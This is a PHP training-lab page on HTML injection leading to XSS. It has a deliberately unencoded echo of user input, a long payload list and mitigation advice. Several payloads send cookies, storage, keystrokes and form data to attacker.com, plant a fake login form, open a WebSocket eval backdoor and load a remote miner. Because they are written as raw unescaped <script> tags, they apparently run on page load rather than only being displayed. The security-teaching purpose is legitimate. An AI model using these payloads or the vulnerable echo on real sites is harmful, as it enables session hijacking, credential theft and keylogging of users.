<?php
// Lab 5: HTML Injection with XSS
// Vulnerability: HTML injection leading to Cross-Site Scripting

session_start();

$message = '';
$injected_content = '';
$user_input = '';

// Simulate HTML injection with XSS vulnerability
function process_html_input_xss($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle HTML injection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['inject_html'])) {
    $user_input = $_POST['html_input'] ?? '';
    
    if ($user_input) {
        $injected_content = process_html_input_xss($user_input);
        $message = '<div class="alert alert-success">HTML content processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: HTML Injection with XSS - HTML Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .injected-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .xss-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to HTML Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: HTML Injection with XSS</h1>
            <p class="hero-subtitle">HTML injection leading to Cross-Site Scripting</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates the most dangerous form of HTML injection vulnerability where HTML injection can lead to Cross-Site Scripting (XSS). This is the ultimate goal of HTML injection attacks and represents the highest risk to applications.</p>
            <p><strong>Objective:</strong> Achieve Cross-Site Scripting through HTML injection vulnerabilities.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>XSS Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output leading to XSS
function process_html_input_xss($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-exclamation-triangle me-2"></i>XSS HTML Injection
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="xss-warning">
                            <h5>⚠️ XSS WARNING</h5>
                            <p>This lab demonstrates XSS vulnerabilities. The following can execute JavaScript:</p>
                            <ul>
                                <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Basic XSS</li>
                                <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code> - Image XSS</li>
                                <li><code>&lt;svg onload="alert('XSS')"&gt;</code> - SVG XSS</li>
                                <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;</code> - Iframe XSS</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>XSS Payloads</h5>
                            <p>Try these XSS payloads:</p>
                            <ul>
                                <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Basic XSS</li>
                                <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code> - Image XSS</li>
                                <li><code>&lt;svg onload="alert('XSS')"&gt;</code> - SVG XSS</li>
                                <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;</code> - Iframe XSS</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="inject_html" value="1">
                            <div class="mb-3">
                                <label for="html_input" class="form-label">HTML Content to Inject</label>
                                <textarea class="form-control" id="html_input" name="html_input" 
                                          rows="4" placeholder="Enter HTML content..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Inject HTML</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($injected_content): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Injected Content
                    </div>
                    <div class="card-body">
                        <div class="injected-display">
                            <h5>Rendered HTML</h5>
                            <div class="sensitive-data">
                                <?php echo $injected_content; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> HTML Injection with XSS</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct HTML output leading to XSS</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>XSS Payloads</h5>
                    <ul>
                        <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Basic XSS</li>
                        <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code> - Image XSS</li>
                        <li><code>&lt;svg onload="alert('XSS')"&gt;</code> - SVG XSS</li>
                        <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;</code> - Iframe XSS</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>HTML Injection XSS Payloads</h5>
            <p>Use these payloads to achieve Cross-Site Scripting:</p>
            
            <h6>1. Basic XSS Payloads:</h6>
            <div class="code-block"><script>alert('XSS')</script>
<script>alert("XSS")</script>
<script>alert(`XSS`)</script>
<script>alert('XSS')</script>
<script>alert("XSS")</script></div>

            <h6>2. Image XSS Payloads:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>3. SVG XSS Payloads:</h6>
            <div class="code-block"><svg onload="alert('XSS')">
<svg onload="alert('XSS')">
<svg onload="alert('XSS')">
<svg onload="alert('XSS')">
<svg onload="alert('XSS')"></div>

            <h6>4. Iframe XSS Payloads:</h6>
            <div class="code-block"><iframe src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')"></div>

            <h6>5. Form XSS Payloads:</h6>
            <div class="code-block"><form action="javascript:alert('XSS')">
<form onsubmit="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<button onclick="alert('XSS')">Click me</button>
<select onchange="alert('XSS')"><option>Test</option></select></div>

            <h6>6. Link XSS Payloads:</h6>
            <div class="code-block"><a href="javascript:alert('XSS')">Click me</a>
<a href="#" onclick="alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click me</a>
<a href="#" onclick="alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click me</a></div>

            <h6>7. CSS XSS Payloads:</h6>
            <div class="code-block"><style>body{background:url('javascript:alert("XSS")')}</style>
<style>@import url('javascript:alert("XSS")')</style>
<style>body{background:url('javascript:alert("XSS")')}</style>
<style>@import url('javascript:alert("XSS")')</style>
<style>body{background:url('javascript:alert("XSS")')}</style></div>

            <h6>8. Meta XSS Payloads:</h6>
            <div class="code-block"><meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
<meta name="description" content="<script>alert('XSS')</script>">
<title><script>alert('XSS')</script></title>
<link rel="stylesheet" href="javascript:alert('XSS')"></div>

            <h6>9. Event Handler XSS Payloads:</h6>
            <div class="code-block"><div onmouseover="alert('XSS')">Hover me</div>
<img src="x" onerror="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<select onchange="alert('XSS')"><option>Test</option></select>
<textarea onfocus="alert('XSS')" autofocus></textarea></div>

            <h6>10. Advanced XSS Payloads:</h6>
            <div class="code-block"><script>
    // Steal cookies
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
    
    // Redirect user
    window.location = 'https://attacker.com';
    
    // Keylogger
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/keys?key=' + e.key);
    });
</script></div>

            <h6>11. DOM Manipulation XSS:</h6>
            <div class="code-block"><script>
    // Change page content
    document.body.innerHTML = '<h1>HACKED!</h1>';
    
    // Add malicious elements
    var img = document.createElement('img');
    img.src = 'https://attacker.com/steal?data=' + document.cookie;
    document.body.appendChild(img);
    
    // Create fake login form
    var form = document.createElement('form');
    form.action = 'https://attacker.com/steal';
    form.innerHTML = '<input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><input type="submit" value="Login">';
    document.body.appendChild(form);
</script></div>

            <h6>12. Session Hijacking XSS:</h6>
            <div class="code-block"><script>
    // Steal session data
    var sessionData = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        url: window.location.href
    };
    
    fetch('https://attacker.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sessionData)
    });
</script></div>

            <h6>13. Form Hijacking XSS:</h6>
            <div class="code-block"><script>
    // Hijack all forms
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            e.preventDefault();
            var data = new FormData(this);
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: data
            });
        });
    }
</script></div>

            <h6>14. Keylogger XSS:</h6>
            <div class="code-block"><script>
    // Keylogger
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/keys?key=' + e.key);
    });
    
    // Form data logger
    var inputs = document.getElementsByTagName('input');
    for (var i = 0; i < inputs.length; i++) {
        inputs[i].addEventListener('change', function(e) {
            fetch('https://attacker.com/input?name=' + e.target.name + '&value=' + e.target.value);
        });
    }
</script></div>

            <h6>15. Reverse Shell XSS:</h6>
            <div class="code-block"><script>
    // Reverse shell
    var ws = new WebSocket('ws://attacker.com:8080');
    ws.onopen = function() {
        ws.send('Connected');
    };
    ws.onmessage = function(event) {
        eval(event.data);
    };
</script></div>

            <h6>16. Cryptocurrency Mining XSS:</h6>
            <div class="code-block"><script>
    // Cryptocurrency mining
    var script = document.createElement('script');
    script.src = 'https://attacker.com/miner.js';
    document.head.appendChild(script);
</script></div>

            <h6>17. Data Exfiltration XSS:</h6>
            <div class="code-block"><script>
    // Data exfiltration
    var data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        url: window.location.href,
        referrer: document.referrer,
        title: document.title
    };
    
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
</script></div>

            <h6>18. Advanced Persistence XSS:</h6>
            <div class="code-block"><script>
    // Advanced persistence
    var payload = '<script>alert("XSS")</script>';
    localStorage.setItem('xss', payload);
    
    // Auto-execute on page load
    if (localStorage.getItem('xss')) {
        document.body.innerHTML += localStorage.getItem('xss');
    }
    
    // Persist across sessions
    sessionStorage.setItem('xss', payload);
</script></div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Complete session hijacking and account takeover</li>
                <li>Data exfiltration and sensitive information theft</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Cryptocurrency mining and resource abuse</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use HTML encoding functions (htmlspecialchars, htmlentities)</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use whitelist-based filtering for allowed HTML tags</li>
                    <li>Implement proper output encoding</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual HTML injection patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
